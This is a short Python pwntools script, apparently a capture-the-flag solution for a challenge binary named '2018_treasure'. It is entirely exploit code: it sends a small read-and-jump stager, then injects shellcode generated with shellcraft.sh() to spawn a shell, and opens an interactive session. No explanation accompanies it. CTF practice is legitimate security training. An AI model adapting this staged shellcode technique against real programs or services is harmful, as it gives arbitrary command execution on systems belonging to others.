from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './2018_treasure'
io=process(pwnfile)

elf = ELF(pwnfile)			
	
def debug():
	gdb.attach(io)
	pause()

debug()
pay = asm("xchg rdx, rsi;syscall;call rsi")

io.sendlineafter("will you continue?(enter 'n' to quit) :","y")

io.sendafter("start!!!!",pay)
nop = asm("nop")
io.sendline(b"a"*5 + asm(shellcraft.sh()))
io.interactive()
